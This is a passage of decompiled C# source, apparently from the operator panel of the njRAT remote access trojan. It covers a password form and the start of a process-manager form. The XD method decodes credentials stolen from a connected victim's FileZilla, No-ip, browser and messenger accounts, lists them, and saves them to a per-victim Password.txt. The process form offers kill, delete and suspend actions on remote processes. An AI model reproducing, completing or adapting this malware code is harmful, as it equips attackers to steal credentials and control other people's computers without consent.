			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem10_Click);
				bool flag = this._ToolStripMenuItem10 != null;
				if (flag)
				{
					this._ToolStripMenuItem10.Click -= value2;
				}
				this._ToolStripMenuItem10 = value;
				flag = (this._ToolStripMenuItem10 != null);
				if (flag)
				{
					this._ToolStripMenuItem10.Click += value2;
				}
			}
		}

		internal virtual NYX_GroupBox NyX_GroupBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NyX_GroupBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NyX_GroupBox1 = value;
			}
		}

		internal virtual ToolStripMenuItem RrToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RrToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.RrToolStripMenuItem_Click);
				bool flag = this._RrToolStripMenuItem != null;
				if (flag)
				{
					this._RrToolStripMenuItem.Click -= value2;
				}
				this._RrToolStripMenuItem = value;
				flag = (this._RrToolStripMenuItem != null);
				if (flag)
				{
					this._RrToolStripMenuItem.Click += value2;
				}
			}
		}

		internal virtual ToolStripMenuItem ColorLinesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColorLinesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ColorLinesToolStripMenuItem_Click);
				bool flag = this._ColorLinesToolStripMenuItem != null;
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click -= value2;
				}
				this._ColorLinesToolStripMenuItem = value;
				flag = (this._ColorLinesToolStripMenuItem != null);
				if (flag)
				{
					this._ColorLinesToolStripMenuItem.Click += value2;
				}
			}
		}

		[DebuggerNonUserCode]
		public Frm_Password()
		{
			base.Load += new EventHandler(this.Pass_Load);
			base.Resize += new EventHandler(this.Pass_Resize);
			Frm_Password.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Frm_Password.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Frm_Password.__ENCList.Count == Frm_Password.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Frm_Password.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Frm_Password.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Frm_Password.__ENCList[num] = Frm_Password.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Frm_Password.__ENCList.RemoveRange(num, Frm_Password.__ENCList.Count - num);
						Frm_Password.__ENCList.Capacity = Frm_Password.__ENCList.Count;
					}
					Frm_Password.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Frm_Password));
			this.MenuStrip1 = new MenuStrip();
			this.PassToolStripMenuItem = new ToolStripMenuItem();
			this.ImageList1 = new ImageList(this.components);
			this.L1 = new ListView();
			this.ColumnHeader1 = new ColumnHeader();
			this.ColumnHeader2 = new ColumnHeader();
			this.ColumnHeader5 = new ColumnHeader();
			this.ColumnHeader4 = new ColumnHeader();
			this.ContextMenuStrip2 = new ContextMenuStrip(this.components);
			this.ToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripMenuItem4 = new ToolStripMenuItem();
			this.CopySiteToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem5 = new ToolStripMenuItem();
			this.ToolStripMenuItem6 = new ToolStripMenuItem();
			this.ToolStripMenuItem7 = new ToolStripMenuItem();
			this.ToolStripMenuItem9 = new ToolStripMenuItem();
			this.FindToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem10 = new ToolStripMenuItem();
			this.RrToolStripMenuItem = new ToolStripMenuItem();
			this.ColorLinesToolStripMenuItem = new ToolStripMenuItem();
			this.ImageList2 = new ImageList(this.components);
			this.OpenFileDialog1 = new OpenFileDialog();
			this.sf = new SaveFileDialog();
			this.ProgressBar1 = new ProgressBar();
			this.Timer1 = new Timer(this.components);
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.MenuStrip1.SuspendLayout();
			this.ContextMenuStrip2.SuspendLayout();
			this.SuspendLayout();
			this.MenuStrip1.BackColor = Color.Black;
			this.MenuStrip1.Items.AddRange(new ToolStripItem[]
			{
				this.PassToolStripMenuItem
			});
			Control arg_1D1_0 = this.MenuStrip1;
			Point location = new Point(0, 0);
			arg_1D1_0.Location = location;
			this.MenuStrip1.Name = "MenuStrip1";
			Control arg_1FF_0 = this.MenuStrip1;
			Size size = new Size(699, 24);
			arg_1FF_0.Size = size;
			this.MenuStrip1.TabIndex = 0;
			this.MenuStrip1.Text = "MenuStrip1";
			this.PassToolStripMenuItem.BackColor = Color.Transparent;
			this.PassToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.PassToolStripMenuItem.Name = "PassToolStripMenuItem";
			ToolStripItem arg_26A_0 = this.PassToolStripMenuItem;
			size = new Size(42, 20);
			arg_26A_0.Size = size;
			this.PassToolStripMenuItem.Text = "Pass";
			this.ImageList1.ColorDepth = ColorDepth.Depth32Bit;
			ImageList arg_2A3_0 = this.ImageList1;
			size = new Size(20, 20);
			arg_2A3_0.ImageSize = size;
			this.ImageList1.TransparentColor = Color.Transparent;
			this.L1.BackColor = Color.Black;
			this.L1.Columns.AddRange(new ColumnHeader[]
			{
				this.ColumnHeader1,
				this.ColumnHeader2,
				this.ColumnHeader5,
				this.ColumnHeader4
			});
			this.L1.ContextMenuStrip = this.ContextMenuStrip2;
			this.L1.Dock = DockStyle.Fill;
			this.L1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.L1.ForeColor = Color.LightSteelBlue;
			this.L1.LargeImageList = this.ImageList2;
			Control arg_385_0 = this.L1;
			location = new Point(0, 24);
			arg_385_0.Location = location;
			this.L1.Name = "L1";
			Control arg_3B6_0 = this.L1;
			size = new Size(699, 193);
			arg_3B6_0.Size = size;
			this.L1.SmallImageList = this.ImageList2;
			this.L1.TabIndex = 1;
			this.L1.UseCompatibleStateImageBehavior = false;
			this.L1.View = View.Details;
			this.ColumnHeader1.Text = "User";
			this.ColumnHeader1.Width = 102;
			this.ColumnHeader2.Text = "Pass";
			this.ColumnHeader2.Width = 112;
			this.ColumnHeader5.Text = "URL";
			this.ColumnHeader5.Width = 92;
			this.ColumnHeader4.Text = "App";
			this.ColumnHeader4.Width = 124;
			this.ContextMenuStrip2.Items.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem1,
				this.ToolStripMenuItem4,
				this.CopySiteToolStripMenuItem,
				this.ToolStripMenuItem5,
				this.ToolStripMenuItem6,
				this.FindToolStripMenuItem,
				this.ToolStripMenuItem10,
				this.RrToolStripMenuItem,
				this.ColorLinesToolStripMenuItem
			});
			this.ContextMenuStrip2.Name = "ContextMenuStrip1";
			Control arg_510_0 = this.ContextMenuStrip2;
			size = new Size(176, 202);
			arg_510_0.Size = size;
			this.ToolStripMenuItem1.BackColor = Color.Black;
			this.ToolStripMenuItem1.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem1.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem1.Image");
			this.ToolStripMenuItem1.Name = "ToolStripMenuItem1";
			ToolStripItem arg_57C_0 = this.ToolStripMenuItem1;
			size = new Size(175, 22);
			arg_57C_0.Size = size;
			this.ToolStripMenuItem1.Text = "Copy User";
			this.ToolStripMenuItem4.BackColor = Color.Black;
			this.ToolStripMenuItem4.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem4.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem4.Image");
			this.ToolStripMenuItem4.Name = "ToolStripMenuItem4";
			ToolStripItem arg_5F9_0 = this.ToolStripMenuItem4;
			size = new Size(175, 22);
			arg_5F9_0.Size = size;
			this.ToolStripMenuItem4.Text = "Copy Pass";
			this.CopySiteToolStripMenuItem.BackColor = Color.Black;
			this.CopySiteToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.CopySiteToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("CopySiteToolStripMenuItem.Image");
			this.CopySiteToolStripMenuItem.Name = "CopySiteToolStripMenuItem";
			ToolStripItem arg_676_0 = this.CopySiteToolStripMenuItem;
			size = new Size(175, 22);
			arg_676_0.Size = size;
			this.CopySiteToolStripMenuItem.Text = "Copy Site";
			this.ToolStripMenuItem5.BackColor = Color.Black;
			this.ToolStripMenuItem5.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem5.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem5.Image");
			this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
			ToolStripItem arg_6F3_0 = this.ToolStripMenuItem5;
			size = new Size(175, 22);
			arg_6F3_0.Size = size;
			this.ToolStripMenuItem5.Text = "Copy ALL";
			this.ToolStripMenuItem6.BackColor = Color.Black;
			this.ToolStripMenuItem6.DropDownItems.AddRange(new ToolStripItem[]
			{
				this.ToolStripMenuItem7,
				this.ToolStripMenuItem9
			});
			this.ToolStripMenuItem6.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem6.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem6.Image");
			this.ToolStripMenuItem6.Name = "ToolStripMenuItem6";
			ToolStripItem arg_79D_0 = this.ToolStripMenuItem6;
			size = new Size(175, 22);
			arg_79D_0.Size = size;
			this.ToolStripMenuItem6.Text = "Save All";
			this.ToolStripMenuItem7.BackColor = Color.Black;
			this.ToolStripMenuItem7.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem7.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem7.Image");
			this.ToolStripMenuItem7.Name = "ToolStripMenuItem7";
			ToolStripItem arg_81A_0 = this.ToolStripMenuItem7;
			size = new Size(139, 22);
			arg_81A_0.Size = size;
			this.ToolStripMenuItem7.Text = "In Clipboard";
			this.ToolStripMenuItem9.BackColor = Color.Black;
			this.ToolStripMenuItem9.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem9.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem9.Image");
			this.ToolStripMenuItem9.Name = "ToolStripMenuItem9";
			ToolStripItem arg_897_0 = this.ToolStripMenuItem9;
			size = new Size(139, 22);
			arg_897_0.Size = size;
			this.ToolStripMenuItem9.Text = "In Disk";
			this.FindToolStripMenuItem.BackColor = Color.Black;
			this.FindToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.FindToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("FindToolStripMenuItem.Image");
			this.FindToolStripMenuItem.Name = "FindToolStripMenuItem";
			ToolStripItem arg_914_0 = this.FindToolStripMenuItem;
			size = new Size(175, 22);
			arg_914_0.Size = size;
			this.FindToolStripMenuItem.Text = "Find";
			this.ToolStripMenuItem10.BackColor = Color.Black;
			this.ToolStripMenuItem10.ForeColor = Color.LightSteelBlue;
			this.ToolStripMenuItem10.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem10.Image");
			this.ToolStripMenuItem10.Name = "ToolStripMenuItem10";
			ToolStripItem arg_991_0 = this.ToolStripMenuItem10;
			size = new Size(175, 22);
			arg_991_0.Size = size;
			this.ToolStripMenuItem10.Text = "Remove Empty PW";
			this.RrToolStripMenuItem.BackColor = Color.Black;
			this.RrToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.RrToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("RrToolStripMenuItem.Image");
			this.RrToolStripMenuItem.Name = "RrToolStripMenuItem";
			ToolStripItem arg_A0E_0 = this.RrToolStripMenuItem;
			size = new Size(175, 22);
			arg_A0E_0.Size = size;
			this.RrToolStripMenuItem.Text = "Victim Color";
			this.ColorLinesToolStripMenuItem.BackColor = Color.Black;
			this.ColorLinesToolStripMenuItem.ForeColor = Color.LightSteelBlue;
			this.ColorLinesToolStripMenuItem.Image = (Image)componentResourceManager.GetObject("ColorLinesToolStripMenuItem.Image");
			this.ColorLinesToolStripMenuItem.Name = "ColorLinesToolStripMenuItem";
			ToolStripItem arg_A8B_0 = this.ColorLinesToolStripMenuItem;
			size = new Size(175, 22);
			arg_A8B_0.Size = size;
			this.ColorLinesToolStripMenuItem.Text = "Color Lines";
			this.ImageList2.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("ImageList2.ImageStream");
			this.ImageList2.TransparentColor = Color.Transparent;
			this.ImageList2.Images.SetKeyName(0, "1.bmp");
			this.ImageList2.Images.SetKeyName(1, "2.bmp");
			this.ImageList2.Images.SetKeyName(2, "3.bmp");
			this.ImageList2.Images.SetKeyName(3, "4.bmp");
			this.ImageList2.Images.SetKeyName(4, "5.bmp");
			this.ImageList2.Images.SetKeyName(5, "6.bmp");
			this.ImageList2.Images.SetKeyName(6, "7.bmp");
			this.ImageList2.Images.SetKeyName(7, "8.bmp");
			this.ImageList2.Images.SetKeyName(8, "9.bmp");
			this.ImageList2.Images.SetKeyName(9, "10.bmp");
			this.ImageList2.Images.SetKeyName(10, "11.bmp");
			this.ImageList2.Images.SetKeyName(11, "12.bmp");
			this.ImageList2.Images.SetKeyName(12, "13.bmp");
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_C32_0 = this.ProgressBar1;
			location = new Point(0, 207);
			arg_C32_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_C60_0 = this.ProgressBar1;
			size = new Size(699, 10);
			arg_C60_0.Size = size;
			this.ProgressBar1.TabIndex = 107;
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_CEC_0 = this.NyX_GroupBox1;
			location = new Point(100, 0);
			arg_CEC_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_D41_0 = this.NyX_GroupBox1;
			size = new Size(1553, 24);
			arg_D41_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 108;
			this.NyX_GroupBox1.Text = ".";
			this.NyX_GroupBox1.TransparencyKey = Color.Empty;
			this.NyX_GroupBox1.Transparent = false;
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			size = new Size(699, 217);
			this.ClientSize = size;
			this.Controls.Add(this.NyX_GroupBox1);
			this.Controls.Add(this.ProgressBar1);
			this.Controls.Add(this.L1);
			this.Controls.Add(this.MenuStrip1);
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.MainMenuStrip = this.MenuStrip1;
			this.Name = "Frm_Password";
			this.Text = "Password";
			this.MenuStrip1.ResumeLayout(false);
			this.MenuStrip1.PerformLayout();
			this.ContextMenuStrip2.ResumeLayout(false);
			this.ResumeLayout(false);
			this.PerformLayout();
		}

		private void FindToolStripMenuItem_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					string text = Interaction.InputBox("Search", "", "", -1, -1);
					bool flag = Operators.CompareString(text, "", false) != 0;
					if (flag)
					{
						IEnumerator enumerator = null;
						Frm_Password frm_Password = new Frm_Password();
						frm_Password.Name = "e";
						frm_Password.Text = "Search For '" + text + "'";
						frm_Password.Show();
						try
						{
							enumerator = this.L1.Items.GetEnumerator();
							while (enumerator.MoveNext())
							{
								ListViewItem listViewItem = (ListViewItem)enumerator.Current;
								int num = 0;
								do
								{
									flag = (Strings.InStr(listViewItem.SubItems[num].Text.ToLower(), text.ToLower(), CompareMethod.Binary) > 0);
									if (flag)
									{
										ListViewItem listViewItem2 = frm_Password.L1.Items.Add(listViewItem.Text, listViewItem.ImageIndex);
										int num2 = listViewItem.SubItems.Count - 1;
										for (int i = 1; i <= num2; i++)
										{
											listViewItem2.SubItems.Add(listViewItem.SubItems[i].Text);
										}
									}
									else
									{
										num++;
									}
								}
								while (num <= 2);
							}
						}
						finally
						{
							flag = (enumerator is IDisposable);
							if (flag)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						this.PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(frm_Password.L1.Items.Count));
						this.FxCOLM(frm_Password.L1);
					}
				}
				catch (Exception expr_1AB)
				{
					ProjectData.SetProjectError(expr_1AB);
					Exception projectError = expr_1AB;
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
			}
		}

		public void FxCOLM(ListView L1)
		{
			checked
			{
				int num = L1.Columns.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					L1.Columns[i].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
				}
			}
		}

		private void InClipboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void InDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void L1_ColumnClick(object sender, ColumnClickEventArgs e)
		{
			ColumnHeader columnHeader = this.L1.Columns[e.Column];
			bool flag = this.m_SortingColumn == null;
			SortOrder sortOrder;
			bool flag2;
			if (flag)
			{
				sortOrder = SortOrder.Ascending;
			}
			else
			{
				flag = columnHeader.Equals(this.m_SortingColumn);
				if (flag)
				{
					flag2 = this.m_SortingColumn.Text.StartsWith("> ");
					if (flag2)
					{
						sortOrder = SortOrder.Descending;
					}
					else
					{
						sortOrder = SortOrder.Ascending;
					}
				}
				else
				{
					sortOrder = SortOrder.Ascending;
				}
				this.m_SortingColumn.Text = this.m_SortingColumn.Text.Substring(2);
			}
			this.m_SortingColumn = columnHeader;
			flag2 = (sortOrder == SortOrder.Ascending);
			if (flag2)
			{
				this.m_SortingColumn.Text = "> " + this.m_SortingColumn.Text;
			}
			else
			{
				this.m_SortingColumn.Text = "< " + this.m_SortingColumn.Text;
			}
			this.L1.ListViewItemSorter = new clsListviewSorter(e.Column, sortOrder);
			this.L1.Sort();
			this.L1.ListViewItemSorter = null;
		}

		private void L1_DoubleClick(object sender, EventArgs e)
		{
			try
			{
				string text = this.L1.SelectedItems[0].SubItems[2].Text;
				bool flag = !text.Contains("://");
				if (flag)
				{
					text = "http://" + text;
				}
				Process.Start(text);
			}
			catch (Exception expr_4C)
			{
				ProjectData.SetProjectError(expr_4C);
				Exception projectError = expr_4C;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void L1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void Pass_Load(object sender, EventArgs e)
		{
			this.Timer1.Start();
		}

		private void Pass_Resize(object sender, EventArgs e)
		{
			try
			{
				this.L1.Columns[3].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);
			}
			catch (Exception expr_1C)
			{
				ProjectData.SetProjectError(expr_1C);
				Exception projectError = expr_1C;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void RemoveEmptyPWToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		public string SV()
		{
			IEnumerator enumerator = null;
			string text = "";
			try
			{
				enumerator = this.L1.Items.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					text = string.Concat(new string[]
					{
						text,
						"URL=",
						listViewItem.SubItems[2].Text,
						"\r\nUSER=",
						listViewItem.Text,
						"\r\nPASS=",
						listViewItem.SubItems[1].Text,
						"\r\n\r\n"
					});
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			return text;
		}

		private void ToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			this.Bo = true;
			this.L1.BringToFront();
		}

		public void XD(ref Client c, ref string S)
		{
			string[] array = Strings.Split(S, " ", -1, CompareMethod.Binary);
			int num = -1;
			bool flag = !Directory.Exists(c.Folder);
			if (flag)
			{
				Directory.CreateDirectory(c.Folder);
			}
			string[] array2 = new string[]
			{
				"FileZilla",
				"No-ip",
				"DynDns",
				"Paltalk",
				"FireFox",
				"Chrome",
				"MSN",
				"Yahoo",
				"Opera",
				"Internet Explorer"
			};
			string text = "";
			string[] array3 = array;
			checked
			{
				for (int i = 0; i < array3.Length; i++)
				{
					string text2 = array3[i];
					try
					{
						flag = (text2.Length > 0);
						if (flag)
						{
							bool flag2 = Operators.CompareString(text2, "*", false) == 0;
							if (flag2)
							{
								num++;
							}
							else
							{
								flag2 = !text2.Contains(":");
								if (flag2)
								{
									text2 = FN.DEB(ref text2);
								}
								string[] array4 = Strings.Split(text2, ":", -1, CompareMethod.Binary);
								flag2 = (array4.Length > 3);
								if (flag2)
								{
									string arg_15B_0 = text2;
									string arg_15B_1 = array4[0] + ":" + array4[1];
									string text3 = array4[0] + ":" + array4[1];
									array4 = Strings.Split(Strings.Replace(arg_15B_0, arg_15B_1, FN.ENB(ref text3), 1, -1, CompareMethod.Binary), ":", -1, CompareMethod.Binary);
								}
								ListViewItem listViewItem = new ListViewItem();
								listViewItem = this.L1.Items.Add(FN.DEB(ref array4[1]), num);
								listViewItem.SubItems.Add(FN.DEB(ref array4[2]));
								listViewItem.SubItems.Add(FN.DEB(ref array4[0]));
								listViewItem.SubItems.Add(array2[num]);
								NewLateBinding.LateCall(listViewItem.SubItems, null, "Add", new object[]
								{
									RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sokserver.vno(c.L))))
								}, null, null, null, true);
								text = text + "USR: " + listViewItem.Text + "\r\n";
								text = text + "PWD: " + listViewItem.SubItems[1].Text + "\r\n";
								text = text + "URL: " + listViewItem.SubItems[2].Text + "\r\n\r\n";
							}
						}
					}
					catch (Exception expr_27D)
					{
						ProjectData.SetProjectError(expr_27D);
						Exception projectError = expr_27D;
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
						ProjectData.ClearProjectError();
					}
				}
				try
				{
					File.WriteAllText(c.Folder + "Password.txt", text);
				}
				catch (Exception expr_2D3)
				{
					ProjectData.SetProjectError(expr_2D3);
					Exception projectError2 = expr_2D3;
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					ProjectData.ClearProjectError();
				}
				this.FxCOLM(this.L1);
				this.PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(this.L1.Items.Count));
			}
		}

		private void ToolStripMenuItem5_Click(object sender, EventArgs e)
		{
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.ProgressBar1.Value == 100;
			if (flag)
			{
				this.ProgressBar1.Value = 0;
			}
			else
			{
				this.ProgressBar1.Value = checked((int)Math.Round(unchecked(Conversion.Val(this.ProgressBar1.Value) + Conversion.Val(10))));
			}
		}

		private void ToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].Text);
				}
			}
			catch (Exception expr_43)
			{
				ProjectData.SetProjectError(expr_43);
				Exception projectError = expr_43;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[1].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[1].Text);
				}
			}
			catch (Exception expr_59)
			{
				ProjectData.SetProjectError(expr_59);
				Exception projectError = expr_59;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void CopySiteToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].SubItems[2].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].SubItems[2].Text);
				}
			}
			catch (Exception expr_59)
			{
				ProjectData.SetProjectError(expr_59);
				Exception projectError = expr_59;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripMenuItem10_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			try
			{
				enumerator = this.L1.Items.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					bool flag = Operators.CompareString(listViewItem.SubItems[1].Text, "", false) == 0;
					if (flag)
					{
						listViewItem.Remove();
					}
				}
			}
			finally
			{
				bool flag = enumerator is IDisposable;
				if (flag)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			this.PassToolStripMenuItem.Text = "Passwords(X)".Replace("X", Conversions.ToString(this.L1.Items.Count));
		}

		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			try
			{
				string text = this.SV();
				bool flag = text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(text);
					Interaction.MsgBox("Saved in Clipboard", MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception expr_2D)
			{
				ProjectData.SetProjectError(expr_2D);
				Exception projectError = expr_2D;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripMenuItem9_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.sf.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					File.WriteAllText(this.sf.FileName, this.SV());
					Interaction.MsgBox(this.sf.FileName, MsgBoxStyle.OkOnly, null);
				}
			}
			catch (Exception expr_41)
			{
				ProjectData.SetProjectError(expr_41);
				Exception projectError = expr_41;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void ToolStripMenuItem5_Click_1(object sender, EventArgs e)
		{
			try
			{
				string text = "User=" + this.L1.SelectedItems[0].Text;
				text = string.Concat(new string[]
				{
					text,
					"\r\nPass=",
					this.L1.SelectedItems[0].SubItems[1].Text,
					"\r\nURL=",
					this.L1.SelectedItems[0].SubItems[2].Text
				});
				bool flag = text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(text);
				}
			}
			catch (Exception expr_AB)
			{
				ProjectData.SetProjectError(expr_AB);
				Exception projectError = expr_AB;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void FindToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L1.SelectedItems[0].Text.Length > 0;
				if (flag)
				{
					Clipboard.SetText(this.L1.SelectedItems[0].Text);
				}
			}
			catch (Exception expr_43)
			{
				ProjectData.SetProjectError(expr_43);
				Exception projectError = expr_43;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
		}

		private void RrToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.ForeColor = colorDialog.Color;
		}

		private void ColorLinesToolStripMenuItem_Click(object sender, EventArgs e)
		{
			ColorDialog colorDialog = new ColorDialog();
			colorDialog.ShowDialog();
			this.L1.BackColor = colorDialog.Color;
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Frm_Process : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("StatusStrip1")]
		private StatusStrip _StatusStrip1;

		[AccessedThroughProperty("SL")]
		private ToolStripStatusLabel _SL;

		[AccessedThroughProperty("pr")]
		private ToolStripProgressBar _pr;

		[AccessedThroughProperty("M1")]
		private ContextMenuStrip _M1;

		[AccessedThroughProperty("Timer1")]
		private Timer _Timer1;

		[AccessedThroughProperty("RefreshToolStripMenuItem")]
		private ToolStripMenuItem _RefreshToolStripMenuItem;

		[AccessedThroughProperty("KillToolStripMenuItem")]
		private ToolStripMenuItem _KillToolStripMenuItem;

		[AccessedThroughProperty("KillDeleteToolStripMenuItem")]
		private ToolStripMenuItem _KillDeleteToolStripMenuItem;

		[AccessedThroughProperty("SuspendToolStripMenuItem")]
		private ToolStripMenuItem _SuspendToolStripMenuItem;

		[AccessedThroughProperty("ImageList1")]
		private ImageList _ImageList1;

		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

